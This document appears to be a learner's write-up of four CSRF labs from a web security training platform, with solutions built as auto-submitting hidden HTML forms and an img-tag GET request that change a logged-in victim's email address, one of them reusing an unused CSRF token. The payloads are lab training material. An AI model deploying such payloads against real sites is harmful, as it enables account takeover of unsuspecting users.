
# Lab 1

## Description

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution


Use following template:

```
<form method="POST" action="https://0a3c000c046668b2801e7be000c20047.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anythin@web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>
```

**NOTE:** The `@` isn't URL encoded -> get's encoded when sending the payload.


# Lab 2

## Description

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

Looking at the following POST request:

```
POST /my-account/change-email HTTP/2
Host: 0a9e00ba04ae30b88264d3d000580016.web-security-academy.net
[...]

email=test%40company.test&csrf=tA9RcfOazRmPVXu4P2PSdywSWrXDhGQA
```

Which shows a `crsf` parameter holding a CSRF token.

Changing the request method to GET works. Removing the CSRF token still works.  This being a GET request it can be wrapped up in an `img` tag:

```
<img/src="https://0aa300dc041c8f28803c03c200090010.web-security-academy.net/my-account/change-email?email=test%40company.test"/>
```

Going to exploit server and pasting payload into the body and sending it to the victim solves the lab.

**NOTE:** the mail address in the CSRF payload needs to be different than the attackers mail address (unused email).



# Lab 3

## Description

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

As before look for the request responsible for changing the mail address. Trying to change the request method doesn't work here but removing the `csrf` parameter works:

```
POST /my-account/change-email HTTP/2
Host: 0a3000a204295575805994f600ae00ea.web-security-academy.net
[...]
email=test%40company.test
```

Crafting a HTML page with:

```
https://tools.nakanosec.com/csrf/?source=post_page-----db464a61a582--------------------------------
```

-> works great for POST requests:

```
<html>
	<body>
		<form method="POST" action="https://0a3000a204295575805994f600ae00ea.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="test123@company.test"/>
		</form>
	</body>
<html>

```

adding JS code to execute on page load:

```
<script>
	document.forms[0].submit();
</script>
```

and pasting it into our exploit server works and solves the lab.

Full exploit:

```
<html>
	<body>
		<form method="POST" action="https://0a3000a204295575805994f600ae00ea.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="beta@company.test"/>
		</form>
<script>
	document.forms[0].submit();
</script>
	</body>
<html>

```


# Lab 4

## Description

This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

## Solution

As before search for the POST request responsible for mail address changing. Sending it to repeater and hitting send returns:

```
"Invalid CSRF token"
```

Now the server checks for CSRF token validity. 

**Try:** Issue a mail change request while running burp intercept -> copy CSRF token and drop request ->  use that CSRF token in HTML payload.

Using the same payload template as before and adding a CSRF token `input` tag:

```
<html>
	<body>
		<form method="POST" action="https://0ab500120320ead2864f980e0037005e.web-security-academy.net/my-account/change-email">
			<input type="hidden" name="email" value="beta@company.test"/>
			<input type="hidden" name="csrf" value="jgiZMnWd9KBYQA70ynkOSLQmaUkzdSXt"/>
		</form>
<script>
	document.forms[0].submit();
</script>
	</body>
<html>
```

replacing `csrf` value with the unused one:

```
RO0vywiMMgbIXiRTwKygUWwZ2KUaO3td
```

and sending the payload to the victim solves the lab.